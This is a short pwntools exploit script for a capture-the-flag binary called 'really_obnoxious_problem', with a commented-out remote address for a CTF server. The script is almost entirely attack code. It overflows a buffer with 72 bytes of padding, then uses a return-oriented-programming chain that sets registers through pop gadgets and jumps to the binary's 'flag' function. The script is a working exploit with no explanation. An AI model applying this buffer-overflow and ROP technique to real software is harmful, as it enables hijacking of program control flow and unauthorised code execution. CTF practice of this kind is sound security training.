from pwn import *

elf = ELF("./really_obnoxious_problem")
p = elf.process()
#p = remote("challs.actf.co", 31225)
raw_input("DEBUG")
pop_rdi = 0x00000000004013f3
pop_rsi_r15 = 0x00000000004013f1
ret =0x000000000040101a

payload =b"A"*72
payload +=p64(pop_rdi)
payload +=p64(0x1337)
payload +=p64(pop_rsi_r15)
payload +=p64(0x00000000004040A0)
payload +=p64(0x0)
payload += p64(elf.sym['flag'])

p.sendline(b"bobby")
sleep(0.1)
p.sendline(payload)

p.interactive()
